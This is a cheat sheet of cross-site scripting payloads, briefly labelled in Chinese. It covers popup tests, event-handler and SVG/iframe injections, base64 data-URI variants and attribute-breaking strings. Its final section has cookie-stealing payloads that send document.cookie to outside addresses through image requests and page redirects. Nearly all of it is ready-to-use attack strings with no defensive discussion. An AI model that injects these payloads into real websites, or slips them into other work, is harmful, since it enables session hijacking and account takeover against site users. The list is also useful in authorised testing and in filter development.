```javascript
xss三种弹窗方式：
<script>alert('xss')</script>		# 直接执行
<script>confirm('xss')</script>		# 需要点击
<script>prompt('xss')</script>		# 需要输入


xss几种执行：
<script>弹窗方式</script>
<script>document.write('console.log(alert("xss"))')</script>
<script>document.write('console.log(alert("xss"))')</script>
<script>document.write('<script>alert(1)</\script>')</script>
<script>console.log(alert('xss'))</script>
<script>console.error(1)</script>
<script xmlns="http://www.w3.org/1999/xhtml">alert(1)</script>
<a href > ：锚标签
<script>alert('sss')<script> ：script标签
<img src="" > ：图片标签
<input type='submit' value='xx' onclick=javascript:alert('xss')>
<input type='text' value='xx' onkeydown=javascript:alert('xss')>
<img src="" onclick=javascript:alert('xss')>
<img src="" onload=javascript:alert('xss')>
<img src="" onmouseover=javascript:alert('xss')>
<a href=javascript:alert('xss')>sss</a>


特殊标签xss：
<img src=1 onerror='prompt(document.cookie)'>;
<svg/onload=alert(1)>
<svg onload=confirm(1)>
<a href="javascript:alert('hello')">
<iframe src="javascript:alert('hello')"/>
<img src='x' onerror="alert('hello')"/>
<video src='x' onerror="alert('hello')"></video>
<div onclick="alert('hello')" onmouseover="alert('hello2')"><div>


加密xss：
<iframe src/="data:text/html;base64,PHNjcmlwdD5kb2N1bWVudC53cml0ZSgnPHNjcmlwdD5jb25mcmltKDEpPC9cc2NyaXB0PicpPFwvc2NyaXB0Pg=="></iframe>
<a href="data:text/plain;base64,PHNjcmlwdD5kb2N1bWVudC53cml0ZSgnPHNjcmlwdD5jb25mcmltKDEpPC9cc2NyaXB0PicpPFwvc2NyaXB0Pg==">111
<object data="data:text/plain;base64,PHNjcmlwdD5kb2N1bWVudC53cml0ZSgnPHNjcmlwdD5jb25mcmltKDEpPC9cc2NyaXB0PicpPFwvc2NyaXB0Pg=="></object>


经典xss：
Function(alert('1'))()
'Function(alert('1'))()
<button onclick=alert(1)>11


 闭合xss：
 1' onclick="alert('xss')">
 '>< img src=1 onerror="alert('xss')">


其他xss：
<script>new Image().src="http://192.168.52.206/?co="+document.cookie;</script>
<script>document.location="http://127.0.0.1/a.php?cookie="+document.cookie+""</script> xss万能用户
img.src="http://127.0.0.1:4444/a.php?cookie="+document.cookie;
<script>getElementbyclassname("xsss_title").innerHTML = "Webshell";</script>
```

